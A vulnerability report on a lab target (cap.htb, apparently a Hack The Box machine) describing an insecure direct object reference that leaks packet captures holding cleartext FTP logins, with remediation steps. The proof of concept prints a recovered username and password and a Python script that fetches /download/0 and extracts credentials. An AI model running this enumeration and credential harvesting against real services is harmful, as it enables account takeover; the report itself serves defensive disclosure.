# Insecure Direct Object Reference in PCAP Download Exposes Cleartext FTP Credentials

**ID:** vuln-0001
**Severity:** HIGH
**Found:** 2026-03-05 19:48:26 UTC
**Target:** http://cap.htb
**Endpoint:** /download/<id>, /data/<id>
**Method:** GET
**CWE:** CWE-639
**CVSS:** 8.2

## Description

The web application exposes packet capture files through predictable numeric object identifiers at the download endpoint. Access control is not enforced consistently for historical captures, which allows an unauthenticated user to retrieve prior PCAP files belonging to other sessions by requesting a different numeric identifier.

During validation, requesting an earlier capture file exposed network traffic containing a successful FTP login. The packet contents included the username and password in cleartext. Those credentials were then used to authenticate as a legitimate local user on the target system.

This is a direct object reference vulnerability caused by trusting a user-controlled identifier without ownership validation. The issue is compounded by the insecure use of FTP, which places reusable credentials directly into captured traffic.

## Impact

Any unauthenticated attacker can enumerate historical packet captures and retrieve sensitive data recorded from other users or services. In the validated scenario, this enabled recovery of working local credentials for user nathan, which provided access to sensitive files and enabled further compromise of the host.

Business impact includes unauthorized disclosure of credentials, lateral movement into local services, exposure of internal traffic, and escalation from a web-only foothold to authenticated system access.

## Technical Analysis

The vulnerable behavior exists because the application allows direct access to packet captures using a numeric identifier supplied in the URL, for example /download/0 and /data/0. The server converts the identifier to an integer and returns the corresponding file from the upload directory without verifying that the requesting user created or owns that capture.

Observed behavior confirmed that newly generated captures used one identifier while older captures remained directly accessible by requesting lower numbers. Accessing /download/0 returned a PCAP file from a prior session. Inspection of that file revealed FTP protocol exchanges including USER and PASS commands. Because FTP transmits credentials without encryption, the retrieved packet capture contained reusable local account credentials.

Root cause:
The application uses user-controlled object identifiers for direct file access without authorization checks or ownership binding. The design assumes that knowledge of the identifier is sufficient for access control, which is not a valid security control.

## Proof of Concept

To reproduce:

1. Browse to the target application at http://cap.htb.
2. Open the Security Snapshot feature to observe that captures are referenced by a numeric identifier.
3. Request a previous object directly:
   GET /download/0 HTTP/1.1
   Host: cap.htb
4. Save the returned PCAP file and inspect it with strings, tcpdump, or Wireshark.
5. Observe cleartext FTP authentication data in the capture, including:
   USER nathan
   PASS Buck3tH4TF0RM3!
6. Use the recovered credentials against exposed services to confirm they are valid.

Validated evidence:
The recovered credentials successfully granted access to the target over authenticated services and permitted reading of the user flag.

```
import io
import re
import requests

BASE = "http://cap.htb"
TARGET = f"{BASE}/download/0"

def main():
    r = requests.get(TARGET, timeout=10)
    r.raise_for_status()
    data = r.content

    print(f"Downloaded {len(data)} bytes from {TARGET}")

    text = data.decode("latin-1", errors="ignore")
    user = re.search(r"USER\\s+([^\\r\\n]+)", text)
    password = re.search(r"PASS\\s+([^\\r\\n]+)", text)

    if user:
        print("Recovered username:", user.group(1).strip())
    if password:
        print("Recovered password:", password.group(1).strip())

    if not user or not password:
        print("Credential strings were not identified directly in decoded content.")
        print("Inspect the PCAP with Wireshark/tcpdump/strings for manual confirmation.")

if __name__ == "__main__":
    main()
```

## Remediation

1. Enforce authorization checks on every object-backed route, including /data/<id> and /download/<id>.
2. Bind each capture to a specific authenticated user or session and deny access to objects not owned by the requester.
3. Replace predictable sequential identifiers with unguessable references, such as high-entropy UUIDs, but do not rely on obscurity alone.
4. Require authentication before any capture retrieval or analysis features are exposed.
5. Remove or sanitize historical captures that contain sensitive traffic.
6. Eliminate FTP for administrative or user access and replace it with encrypted protocols such as SFTP or SSH-based transfer.
